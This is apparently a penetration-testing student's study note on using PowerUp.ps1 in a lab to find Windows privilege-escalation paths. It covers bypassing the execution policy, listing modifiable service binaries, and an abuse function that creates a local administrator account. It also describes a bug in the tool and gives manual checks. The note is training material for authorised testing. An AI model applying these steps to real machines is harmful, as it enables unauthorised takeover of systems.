---
aliases:
  - PowerUp.ps1
---
# PowerUp.ps1
> [!Note]
> Assume we're using the same scenario as in [hijacking-service-binaries](hijacking-service-binaries.md) and the other notes in this section.

[**PowerUp.ps1**](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) is a tool which we can use to detect [Windows](../../../computers/windows/README.md) privesc vectors. To use it, we just need to copy it to our *attacking machine*, then use a python HTTP server and `iwr` to infiltrate it onto the victim Windows machine.
## Use
After getting the script onto our target box, we need to start [PowerShell](../../../coding/languages/powershell.md) with the `ExecutionPolicy Bypass` to allow our current `dave` user to execute the script:
```powershell
PS C:\Users\dave> powershell -ep bypass
...
PS C:\Users\dave>  . .\PowerUp.ps1
```
### `Get-ModifiableServiceFile`
After importing the script, we can use `Get-ModifiableServiceFile` which is a function that displays [windows-services](windows-services.md) the current user *is allowed to modify*:
```powershell
PS C:\Users\dave> Get-ModifiableServiceFile

...

ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
```
PowerUp identified `mysqld.exe` in the `\xampp` directory as vulnerable (along with some others). It also tells us that we *don't have permission to restart the service*.
### `AbuseFunction`
Listed in the above output is the function `AbuseFunction`. We can use this to replace the binary (if our current user has permission to). This is a built in function, and it use it, we just have to call the command listed to the right of it.

Calling this function results in its default action: create a new user named `john` with the password `Password123!` and add him to the local `Administrators` group. To call it, our current user account also needs permissions to reboot the machine. Unfortunately, our current user `dave` does not have those permissions, so calling it would result in:
```powershell
PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'

Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
modifiable by the current user.
At C:\Users\dave\PowerUp.ps1:2178 char:13
+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
   mysql' for service mysql not modifiable by the current user.
```
Notice that the above error isn't regarding whether `dave` has reboot permissions. Instead, it describes the the path for the `mysql` service is `not modifiable by the current user`. This is a bug you can track down manually in the [PowerUp.ps1 code](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). Basically, when you give a path to a PS function defined in the code as `Get-ModifiablePath`, it breaks. 

Since this function is called when you run the `AbuseFunction` (`Install-ServiceBinary`), it triggers this error, even though we already know the current user `dave` *can modify the binary*. This is all to say that you, again, should never blindly trust an automated tool. Offsec gives the following manual test steps to establish this:
```powershell
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath                IdentityReference Permissions
--------------                ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath     IdentityReference                Permissions
--------------     -----------------                -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 

PS C:\Users\dave> $ModifiableFiles
```

> [!Resources]
> - [**PowerUp.ps1**](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) 
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.